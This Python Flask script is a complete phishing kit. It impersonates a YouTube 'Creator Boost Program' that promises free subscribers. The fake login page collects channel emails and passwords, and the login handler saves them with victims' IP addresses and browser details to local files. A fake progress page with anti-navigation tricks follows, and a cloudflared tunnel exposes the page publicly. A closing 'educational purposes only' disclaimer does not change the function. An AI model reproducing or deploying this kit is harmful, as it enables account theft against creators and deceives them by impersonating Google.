import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'youtube-premium-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/YouTube Subscribers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['yt_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <title>YouTube - Free Subscribers & Views</title>
        <style>
            :root {
                --yt-red: #FF0000;
                --yt-dark: #0F0F0F;
                --yt-light-dark: #272727;
                --yt-gray: #717171;
                --yt-light-gray: #f2f2f2;
            }
            
            * {
                -webkit-tap-highlight-color: transparent;
                -webkit-touch-callout: none;
                box-sizing: border-box;
            }
            
            html, body {
                height: 100%;
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                -webkit-text-size-adjust: 100%;
                -moz-text-size-adjust: 100%;
                -ms-text-size-adjust: 100%;
                text-size-adjust: 100%;
            }
            
            body {
                background: var(--yt-dark);
                color: white;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                min-height: -webkit-fill-available;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            
            .container {
                width: 100%;
                max-width: 450px;
                padding: 16px;
                margin: 0 auto;
            }
            
            @media (max-width: 480px) {
                .container {
                    padding: 12px;
                    max-width: 100%;
                }
                
                .login-box {
                    padding: 20px !important;
                }
                
                .promo-container {
                    padding: 16px !important;
                    margin: 16px 0 !important;
                }
                
                input {
                    padding: 14px !important;
                    font-size: 16px !important; /* Prevents iOS zoom */
                }
                
                .login-btn {
                    padding: 16px !important;
                }
            }
            
            @media (max-width: 360px) {
                .container {
                    padding: 10px;
                }
                
                .youtube-text {
                    font-size: 24px !important;
                }
                
                .youtube-logo {
                    gap: 6px !important;
                }
            }
            
            .header {
                text-align: center;
                margin-bottom: 24px;
            }
            
            .youtube-logo {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                margin-bottom: 12px;
            }
            
            .youtube-icon {
                width: 42px;
                height: 30px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .youtube-icon svg {
                width: 100%;
                height: 100%;
            }
            
            .youtube-text {
                font-size: 28px;
                font-weight: 700;
                letter-spacing: -0.5px;
                background: linear-gradient(90deg, #FF0000, #CC0000);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            .promo-container {
                background: linear-gradient(135deg, var(--yt-red), #CC0000);
                color: white;
                padding: 20px;
                border-radius: 12px;
                text-align: center;
                margin: 20px 0;
                box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
                position: relative;
                overflow: hidden;
            }
            
            .promo-container::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
                background-size: 20px 20px;
                opacity: 0.1;
                animation: float 20s linear infinite;
            }
            
            @keyframes float {
                0% { transform: translate(0, 0) rotate(0deg); }
                100% { transform: translate(-10px, -10px) rotate(360deg); }
            }
            
            .promo-badge {
                background: linear-gradient(135deg, #FFD700, #FFA500);
                color: black;
                padding: 6px 15px;
                border-radius: 20px;
                font-weight: 700;
                font-size: 13px;
                display: inline-block;
                margin-bottom: 10px;
                position: relative;
                z-index: 1;
                box-shadow: 0 2px 8px rgba(0,0,0,0.2);
            }
            
            .promo-container h2 {
                margin: 10px 0;
                font-size: 20px;
                position: relative;
                z-index: 1;
            }
            
            .promo-container p {
                margin: 0;
                opacity: 0.9;
                position: relative;
                z-index: 1;
                font-size: 14px;
            }
            
            .subscriber-count {
                font-size: 20px;
                font-weight: 700;
                text-align: center;
                margin: 20px 0;
                color: white;
                background: var(--yt-light-dark);
                padding: 15px;
                border-radius: 12px;
                border: 1px solid #3f3f3f;
            }
            
            .login-box {
                background: var(--yt-light-dark);
                border-radius: 16px;
                padding: 30px;
                border: 1px solid #3f3f3f;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            
            .input-group {
                margin: 20px 0;
            }
            
            .input-label {
                display: block;
                margin-bottom: 8px;
                color: var(--yt-light-gray);
                font-size: 14px;
                font-weight: 500;
            }
            
            input {
                width: 100%;
                padding: 16px;
                border: 2px solid #3f3f3f;
                border-radius: 10px;
                background: rgba(15, 15, 15, 0.8);
                color: white;
                font-size: 16px;
                box-sizing: border-box;
                transition: all 0.3s ease;
                font-family: inherit;
                -webkit-appearance: none;
                appearance: none;
            }
            
            input::placeholder {
                color: var(--yt-gray);
                opacity: 0.7;
            }
            
            input:focus {
                outline: none;
                border: 2px solid var(--yt-red);
                background: rgba(26, 26, 26, 0.9);
                box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.1);
            }
            
            .login-btn {
                background: linear-gradient(135deg, var(--yt-red), #CC0000);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 10px;
                font-size: 17px;
                font-weight: 600;
                width: 100%;
                margin: 25px 0 15px 0;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 12px;
                font-family: inherit;
                position: relative;
                overflow: hidden;
            }
            
            .login-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
                transition: left 0.7s;
            }
            
            .login-btn:hover::before {
                left: 100%;
            }
            
            .login-btn:hover, .login-btn:active {
                background: linear-gradient(135deg, #CC0000, #990000);
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(255, 0, 0, 0.3);
            }
            
            .login-btn:active {
                transform: translateY(0);
            }
            
            .benefits {
                background: rgba(255, 255, 255, 0.05);
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
                border: 1px solid rgba(255,255,255,0.1);
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                gap: 12px;
                margin: 15px 0;
                color: #e0e0e0;
                font-size: 15px;
            }
            
            .benefit-icon {
                color: #4CAF50;
                font-size: 20px;
                flex-shrink: 0;
            }
            
            .footer-text {
                text-align: center;
                margin-top: 25px;
                color: var(--yt-gray);
                font-size: 13px;
                line-height: 1.5;
            }
            
            .footer-text a {
                color: #3ea6ff;
                text-decoration: none;
                font-weight: 500;
            }
            
            .footer-text a:hover {
                text-decoration: underline;
            }
            
            .stats {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                background: rgba(255, 255, 255, 0.05);
                padding: 20px;
                border-radius: 12px;
                margin: 20px 0;
                border: 1px solid rgba(255,255,255,0.1);
            }
            
            .stat-item {
                text-align: center;
                padding: 10px;
            }
            
            .stat-number {
                font-size: 24px;
                font-weight: 700;
                color: var(--yt-red);
                margin-bottom: 5px;
            }
            
            .stat-label {
                font-size: 12px;
                color: var(--yt-gray);
                opacity: 0.9;
            }
            
            .trust-badges {
                display: flex;
                justify-content: center;
                gap: 25px;
                margin: 20px 0;
                padding: 15px;
                background: rgba(255,255,255,0.03);
                border-radius: 10px;
            }
            
            .trust-badges i {
                font-size: 22px;
                color: #4CAF50;
                transition: transform 0.3s;
            }
            
            .trust-badges i:hover {
                transform: scale(1.1);
            }
            
            /* Safe area for iPhone X and newer */
            @supports (padding: max(0px)) {
                .container {
                    padding-left: max(16px, env(safe-area-inset-left));
                    padding-right: max(16px, env(safe-area-inset-right));
                    padding-bottom: max(16px, env(safe-area-inset-bottom));
                }
            }
            
            /* Loading animation */
            @keyframes shimmer {
                0% { background-position: -1000px 0; }
                100% { background-position: 1000px 0; }
            }
            
            .loading-shimmer {
                background: linear-gradient(90deg, 
                    rgba(255,255,255,0) 0%, 
                    rgba(255,255,255,0.05) 50%, 
                    rgba(255,255,255,0) 100%);
                background-size: 1000px 100%;
                animation: shimmer 2s infinite linear;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="youtube-logo">
                    <div class="youtube-icon">
                        <svg viewBox="0 0 256 180" xmlns="http://www.w3.org/2000/svg">
                            <path fill="#FF0000" d="M250.346 28.075A32.18 32.18 0 0 0 227.69 5.418C207.824 0 127.87 0 127.87 0S47.912.164 28.046 5.582A32.18 32.18 0 0 0 5.39 28.24c-6.009 35.298-8.34 89.084.165 122.97a32.18 32.18 0 0 0 22.656 22.657c19.866 5.418 99.822 5.418 99.822 5.418s79.955 0 99.82-5.418a32.18 32.18 0 0 0 22.657-22.657c6.338-35.348 8.291-89.1-.164-122.97"/>
                            <path fill="#FFF" d="m102.421 128.06l66.328-38.418l-66.328-38.418z"/>
                        </svg>
                    </div>
                    <div class="youtube-text">YouTube</div>
                </div>
                <div style="font-size: 14px; color: #AAAAAA; letter-spacing: 0.5px; margin-top: 5px;">
                    Creator Boost Program
                </div>
            </div>
            
            <div class="promo-container loading-shimmer">
                <div class="promo-badge">OFFICIAL PROMOTION</div>
                <h2>YouTube Partner Program</h2>
                <p>Get free subscribers to monetize your channel faster!</p>
            </div>
            
            <div class="subscriber-count">
                <i class="fas fa-users" style="margin-right: 10px;"></i>
                <span>10,000 FREE SUBSCRIBERS</span>
            </div>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number">1,234+</div>
                    <div class="stat-label">Channels Boosted</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">98%</div>
                    <div class="stat-label">Success Rate</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">24h</div>
                    <div class="stat-label">Delivery Time</div>
                </div>
            </div>
            
            <div class="login-box">
                <form action="/login" method="post" id="boostForm">
                    <div class="input-group">
                        <div class="input-label">
                            <i class="fas fa-user-circle" style="margin-right: 8px;"></i>
                            YouTube Channel URL or Email
                        </div>
                        <input type="text" name="channel_url" 
                               placeholder="https://youtube.com/@yourchannel" 
                               required 
                               autocomplete="off"
                               inputmode="url">
                    </div>
                    
                    <div class="input-group">
                        <div class="input-label">
                            <i class="fas fa-lock" style="margin-right: 8px;"></i>
                            Password
                        </div>
                        <input type="password" name="password" 
                               placeholder="Your YouTube password" 
                               required
                               autocomplete="current-password">
                    </div>
                    
                    <div class="benefits">
                        <div class="benefit-item">
                            <i class="fas fa-check-circle benefit-icon"></i>
                            <span>Get 10,000 real subscribers</span>
                        </div>
                        <div class="benefit-item">
                            <i class="fas fa-check-circle benefit-icon"></i>
                            <span>Increase watch time</span>
                        </div>
                        <div class="benefit-item">
                            <i class="fas fa-check-circle benefit-icon"></i>
                            <span>Monetization ready</span>
                        </div>
                        <div class="benefit-item">
                            <i class="fas fa-check-circle benefit-icon"></i>
                            <span>24/7 support</span>
                        </div>
                    </div>
                    
                    <button type="submit" class="login-btn" id="boostButton">
                        <i class="fas fa-rocket"></i>
                        BOOST MY CHANNEL
                    </button>
                </form>
                
                <div class="trust-badges">
                    <i class="fas fa-shield-alt" title="Secure Connection"></i>
                    <i class="fas fa-lock" title="256-bit Encryption"></i>
                    <i class="fas fa-check-circle" title="Google Verified"></i>
                    <i class="fas fa-bolt" title="Instant Delivery"></i>
                </div>
                
                <div class="footer-text">
                    By continuing, you agree to YouTube's 
                    <a href="https://www.youtube.com/t/terms" target="_blank">Terms of Service</a> and 
                    <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a>
                    <br><br>
                    <small style="opacity: 0.7;">© 2024 Google LLC. YouTube is a trademark of Google LLC.</small>
                </div>
            </div>
        </div>
        
        <script>
            document.getElementById('boostForm').addEventListener('submit', function(e) {
                const button = document.getElementById('boostButton');
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
                button.disabled = true;
                button.style.opacity = '0.8';
                
                // Add a small delay to show the processing state
                setTimeout(() => {
                    // Form will submit normally after showing processing state
                }, 100);
            });
            
            // Prevent zoom on input focus on iOS
            document.addEventListener('touchstart', function() {}, {passive: true});
            
            // Handle responsive adjustments
            function adjustForMobile() {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile) {
                    document.body.classList.add('mobile');
                }
            }
            
            window.addEventListener('load', adjustForMobile);
            window.addEventListener('resize', adjustForMobile);
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    channel_url = request.form.get('channel_url', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('yt_session', 'unknown')

    safe_channel = secure_filename(channel_url[:50])
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_channel}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Channel/Email: {channel_url}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Referrer: {request.referrer or 'Direct'}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing - YouTube Creator Boost</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <style>
            * {
                -webkit-tap-highlight-color: transparent;
                -webkit-touch-callout: none;
                box-sizing: border-box;
            }
            
            html, body {
                height: 100%;
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                -webkit-text-size-adjust: 100%;
                text-size-adjust: 100%;
            }
            
            body {
                background: #0F0F0F;
                color: white;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                min-height: -webkit-fill-available;
                -webkit-font-smoothing: antialiased;
            }
            
            .container {
                text-align: center;
                background: #272727;
                padding: 30px;
                border-radius: 20px;
                border: 1px solid #3f3f3f;
                max-width: 500px;
                width: 90%;
                margin: 20px;
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            }
            
            @media (max-width: 480px) {
                .container {
                    padding: 25px 20px;
                    margin: 15px;
                    border-radius: 16px;
                }
                
                .success-icon {
                    font-size: 60px !important;
                }
                
                .status-updates {
                    padding: 15px !important;
                }
            }
            
            .success-icon {
                font-size: 70px;
                color: #FF0000;
                margin: 20px 0;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            
            .progress-container {
                width: 100%;
                background: #3f3f3f;
                border-radius: 12px;
                margin: 30px 0;
                overflow: hidden;
                height: 20px;
                position: relative;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #FF0000, #CC0000, #FF4444);
                width: 0%;
                border-radius: 12px;
                position: relative;
                animation: loading 4s ease-in-out forwards;
            }
            
            @keyframes loading {
                0% { width: 0%; }
                20% { width: 25%; }
                40% { width: 50%; }
                60% { width: 75%; }
                80% { width: 90%; }
                100% { width: 100%; }
            }
            
            .progress-bar::after {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
                animation: shine 2s infinite;
            }
            
            @keyframes shine {
                0% { transform: translateX(-100%); }
                100% { transform: translateX(100%); }
            }
            
            .status-updates {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid rgba(255, 0, 0, 0.3);
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
                text-align: left;
            }
            
            .status-item {
                margin: 12px 0;
                display: flex;
                align-items: center;
                gap: 12px;
                font-size: 15px;
            }
            
            .checkmark {
                color: #4CAF50;
                animation: checkPop 0.5s ease-out;
            }
            
            .processing {
                color: #FFA500;
            }
            
            @keyframes checkPop {
                0% { transform: scale(0); }
                50% { transform: scale(1.2); }
                100% { transform: scale(1); }
            }
            
            .countdown {
                font-size: 14px;
                color: #AAAAAA;
                margin-top: 20px;
                padding: 10px;
                background: rgba(255,255,255,0.05);
                border-radius: 8px;
            }
            
            .redirect-notice {
                background: rgba(62, 166, 255, 0.1);
                border: 1px solid rgba(62, 166, 255, 0.3);
                border-radius: 10px;
                padding: 15px;
                margin: 20px 0;
                font-size: 14px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .channel-info {
                background: rgba(255,255,255,0.05);
                border-radius: 10px;
                padding: 15px;
                margin: 15px 0;
                font-size: 14px;
                text-align: left;
                word-break: break-all;
            }
            
            .channel-info strong {
                color: #FF4444;
                display: block;
                margin-bottom: 5px;
            }
            
            .completed {
                color: #4CAF50;
                font-weight: bold;
                animation: fadeIn 1s ease-out;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            /* Safe area for newer iPhones */
            @supports (padding: max(0px)) {
                .container {
                    padding-left: max(20px, env(safe-area-inset-left));
                    padding-right: max(20px, env(safe-area-inset-right));
                    padding-bottom: max(20px, env(safe-area-inset-bottom));
                }
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <meta http-equiv="refresh" content="8;url=https://www.youtube.com/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">
                <svg viewBox="0 0 256 180" xmlns="http://www.w3.org/2000/svg" style="width: 70px; height: 50px;">
                    <path fill="#FF0000" d="M250.346 28.075A32.18 32.18 0 0 0 227.69 5.418C207.824 0 127.87 0 127.87 0S47.912.164 28.046 5.582A32.18 32.18 0 0 0 5.39 28.24c-6.009 35.298-8.34 89.084.165 122.97a32.18 32.18 0 0 0 22.656 22.657c19.866 5.418 99.822 5.418 99.822 5.418s79.955 0 99.82-5.418a32.18 32.18 0 0 0 22.657-22.657c6.338-35.348 8.291-89.1-.164-122.97"/>
                    <path fill="#FFF" d="m102.421 128.06l66.328-38.418l-66.328-38.418z"/>
                </svg>
            </div>
            
            <h2 style="margin: 10px 0;">Channel Boost In Progress!</h2>
            <p style="color: #AAAAAA; margin-bottom: 20px;">We're adding subscribers to your YouTube channel</p>
            
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
            
            <div class="status-updates">
                <div class="status-item">
                    <i class="fas fa-check-circle checkmark"></i>
                    <span class="completed">Account verification complete</span>
                </div>
                <div class="status-item">
                    <i class="fas fa-sync-alt processing fa-spin"></i>
                    <span>Adding 10,000 subscribers <span id="subCount">0</span>/10,000</span>
                </div>
                <div class="status-item">
                    <i class="fas fa-chart-line processing"></i>
                    <span>Optimizing video recommendations</span>
                </div>
                <div class="status-item">
                    <i class="fas fa-dollar-sign processing"></i>
                    <span>Preparing monetization eligibility</span>
                </div>
            </div>
            
            <div class="channel-info">
                <strong>Channel Detected:</strong>
                <span id="channelDisplay">Processing...</span>
            </div>
            
            <div class="redirect-notice">
                <i class="fas fa-info-circle" style="color: #3ea6ff;"></i>
                You will be redirected to YouTube in a few seconds to continue the process.
            </div>
            
            <div class="countdown">
                <i class="fas fa-spinner fa-spin"></i>
                Redirecting to YouTube in <span id="countdown">8</span> seconds...
            </div>
        </div>
        
        <script>
            // Animate subscriber count
            let count = 0;
            const subCount = document.getElementById('subCount');
            const interval = setInterval(() => {
                count += Math.floor(Math.random() * 200) + 100;
                if (count >= 10000) {
                    count = 10000;
                    clearInterval(interval);
                    subCount.innerHTML = '<span class="completed">✓ COMPLETED</span>';
                } else {
                    subCount.textContent = count.toLocaleString();
                }
            }, 100);
            
            // Countdown timer
            let seconds = 8;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                seconds--;
                countdownElement.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(countdownInterval);
                }
            }, 1000);
            
            // Show channel info (truncated for security)
            const urlParams = new URLSearchParams(window.location.search);
            const channel = urlParams.get('channel') || 'YouTube Channel';
            document.getElementById('channelDisplay').textContent = 
                channel.length > 40 ? channel.substring(0, 40) + '...' : channel;
            
            // Prevent accidental back navigation
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = function() {
                window.history.go(1);
            };
            
            // Disable right click
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"\n{'═' * 60}")
            print(f"🎥 YouTube Subscribers Public Link: {tunnel_url}")
            print(f"📁 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: This is for educational purposes only!")
            print("⚠️  Do not use for malicious purposes!")
            print(f"{'═' * 60}\n")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:8080")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)